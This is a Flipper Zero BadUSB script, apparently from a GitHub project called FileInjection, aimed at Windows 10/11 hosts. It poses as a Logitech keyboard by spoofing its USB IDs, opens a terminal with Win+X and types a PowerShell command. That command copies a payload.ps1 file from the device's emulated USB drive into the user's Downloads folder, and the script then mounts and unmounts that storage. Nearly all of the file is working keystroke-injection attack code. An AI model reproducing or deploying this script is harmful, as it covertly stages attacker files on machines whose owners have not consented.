// ########################################################################################
// #                                                                                      |
// #                 ███▄ ▄███▓ ██▓ ██▓ ██▀███   ▄▄▄      ▄▄▄       ██ ▄█▀                |
// #                ▓██▒▀█▀ ██▒▓██▒▓██▒▓██ ▒ ██▒▒████▄   ▒████▄     ██▄█▒                 |
// #                ▓██    ▓██░▒██▒▒██▒▓██ ░▄█ ▒▒██  ▀█▄ ▒██  ▀█▄  ▓███▄░                 |
// #                ▒██    ▒██ ░██░░██░▒██▀▀█▄  ░██▄▄▄▄██░██▄▄▄▄██ ▓██ █▄                 |
// #                ▒██▒   ░██▒░██░░██░░██▓ ▒██▒ ▓█   ▓██▒▓█   ▓██▒▒██▒ █▄                | 
// #                ░ ▒░   ░  ░░▓  ░▓  ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒▒   ▓▒█░▒ ▒▒ ▓▒                |
// #                ░  ░      ░ ▒ ░ ▒ ░  ░▒ ░ ▒░  ▒   ▒▒ ░ ▒   ▒▒ ░░ ░▒ ▒░                |
// #                ░      ░    ▒ ░ ▒ ░  ░░   ░   ░   ▒    ░   ▒   ░ ░░ ░                 |
// #                       ░    ░   ░     ░           ░  ░     ░  ░░  ░                   |      
// #                                                                                      |
// #     Title        : FileInjection                                                     |
// #     Link         : https://github.com/miiraak/                                       |
// #     Version      : 2.0                                                               |
// #     Category     : Others                                                            |
// #     Target       : Windows 10/11                                                     |
// #                                                                                      |
// ########################################################################################

print("__Activation des modules__")
let stockage = "/ext/apps_data/mass_storage/Infiltration.img";
let badusb = require("badusb");
let usbdisk = require("usbdisk");
let layout = "fr-CH";

print("__Parametrage du layout__")
badusb.setup({ vid: 0x046D, pid: 0xc33f, mfr_name: "Logitec, Inc",
prod_name: "Keyboard", layout_path: "/ext/badusb/assets/layouts/" + layout + ".kl" });

print("Recherche d'hote...");
while (!badusb.isConnected()) {
    delay(1000);
}

print("__Injection du payload__");
badusb.press("GUI", "x");
delay(300);
badusb.press("i");
delay(3000);
badusb.println("Start-Sleep 10; $DriveLetter = Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter; Copy-Item -Path ${DriveLetter}:/payload.ps1 -Destination C:/Users/$env:username/Downloads; exit;");
badusb.quit();

delay(2000);
usbdisk.start(stockage);

print("Attendez la fermeture du Terminal...");

while (!usbdisk.wasEjected()) {
    delay(1000);
}

print("Done");
usbdisk.stop();

